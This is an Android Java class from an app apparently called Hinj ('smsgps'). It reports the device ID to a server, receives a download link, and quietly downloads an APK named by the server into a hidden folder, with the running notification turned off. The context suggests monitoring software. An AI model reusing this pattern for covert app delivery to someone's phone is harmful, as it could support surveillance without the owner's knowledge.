package com.hinj.secure.smsgps;

import java.io.File;

import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.provider.Settings.Secure;
import android.util.Log;
import android.widget.Toast;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.Utility;
import com.hinj.parsing.HingAppParsing;
import com.hinj.secure.smsgps.DeviceInterface;

public class DownloadAppAsyncTask extends AsyncTask<String, Void, String> {
	
	private static final String TAG = "DownloadAppAsyncTask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	private String clip_board_string;
	private Handler handler;
	
	private long[] downloadIdsNew;
	static int CountIDs = 0;
	private DownloadManager downloadManager;
	
	/**
	 * DownloadAppAsyncTask
	 */
	public DownloadAppAsyncTask(final Context ctx, DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;

	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {
		try{

			downloadIdsNew = new long[30];
			downloadManager = (DownloadManager) ctx.getSystemService(ctx.DOWNLOAD_SERVICE);
			
			downloadApp();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompleteAppDownload();
		}
		
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
	private void downloadApp() {
		
	   if (Utility.isNetworkAvailable(ctx)) {
		//new YourAsyncTask_ContactList().execute(CallDetailList, ""+ total);
		new GetSMSDeleteIdAsyncTask().execute();
	   }
	}
	
	public class GetSMSDeleteIdAsyncTask extends AsyncTask<String, String,Object[]> {
		
		String response = "";
		String upload_device_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		public String destinationFolder = "/Hinj/Apps";
		
		public GetSMSDeleteIdAsyncTask() {
		}

		@Override
		public void onPreExecute() {
		}

		@Override
		public Object[] doInBackground(String... params) {
			
			return HingAppParsing.getAppDownloadLink(ctx,upload_device_id); 
		}  
 
		@Override
		public void onPostExecute(Object[] result) {
			try{
				System.out.println("result " + result);
				boolean status = (Boolean) result[0];
				response = (String) result[1];
				
				if(status)
				{
					newDownload(HinjAppPreferenceUtils.getAppDownloadLink(ctx), destinationFolder, HinjAppPreferenceUtils.getDownloadAppName(ctx)); 
 
				//	Toast.makeText(ctx, "Start App Downloading", Toast.LENGTH_LONG).show();
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
		}
	} 
	
	
	// ******************************************************
	public void newDownload(String downloadPath, String folderName, String FileName) {
		try {

			Uri Download_Uri = Uri.parse(downloadPath);

			DownloadManager.Request request = new DownloadManager.Request(
					Download_Uri);
			// Restrict the types of networks over which this download may
			// proceed.
			request.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_WIFI 	| DownloadManager.Request.NETWORK_MOBILE);
			// Set whether this download may proceed over a roaming connection.
			request.setAllowedOverRoaming(false);
			request.setVisibleInDownloadsUi(true);
			request.setShowRunningNotification(false);

			// Set the local destination for the downloaded file to a path
			// within
			// the application's external files directory
			// request.setDestinationInExternalFilesDir(ChatWindowActivity.this,FileUtils.getDirectory(folderName),fileName);
			String path = Utility.getDirectory(folderName) + File.separator + FileName+".apk";
			File file = null;
			try {
				file = new File(path);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
			Uri external = Uri.fromFile(file);
			request.setDestinationUri(external);
			try {
				downloadIdsNew[CountIDs] = downloadManager.enqueue(request);
			} catch (Exception ex) {
				ex.printStackTrace();
			}

			CountIDs++;

			IntentFilter filter = new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE);
			ctx.registerReceiver(downloadReceiver, filter);

		} catch (Exception ex) {
			 ex.printStackTrace();
		}
	}
	

	public BroadcastReceiver downloadReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context arg0, Intent intent) {
			try {
				DownloadManager.Query query = new DownloadManager.Query();
				query.setFilterById(downloadIdsNew);
				Cursor cursor = downloadManager.query(query);

				if (cursor.moveToFirst()) {
					int columnIndex = cursor
							.getColumnIndex(DownloadManager.COLUMN_STATUS);
					int status = cursor.getInt(columnIndex);
					int columnReason = cursor
							.getColumnIndex(DownloadManager.COLUMN_REASON);
					int reason = cursor.getInt(columnReason);
					long id = intent.getLongExtra(
							DownloadManager.EXTRA_DOWNLOAD_ID, 0);

					if (status == DownloadManager.STATUS_SUCCESSFUL) {

						try {
							Log.e("Ref ID***********", "" + id);

							ctx.unregisterReceiver(downloadReceiver);

						} catch (Exception e) {
							// TODO Auto-generated catch block
							// e.printStackTrace();
						} finally {
							// dataSource.closeDB();
						}

					} else if (status == DownloadManager.STATUS_FAILED) {
						/*Toast.makeText(getActivity(),
								"FAILED!\n" + "reason of " + reason,
								Toast.LENGTH_LONG).show();*/
					} else if (status == DownloadManager.STATUS_PAUSED) {
						/*Toast.makeText(getActivity(),
								"PAUSED!\n" + "reason of " + reason,
								Toast.LENGTH_LONG).show();*/
					} else if (status == DownloadManager.STATUS_PENDING) {
					/*	Toast.makeText(getActivity(), "PENDING!",
								Toast.LENGTH_LONG).show();*/
					} else if (status == DownloadManager.STATUS_RUNNING) {
					/*	Toast.makeText(getActivity(), "RUNNING!",
								Toast.LENGTH_LONG).show();*/
					}
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	};
	
	
}
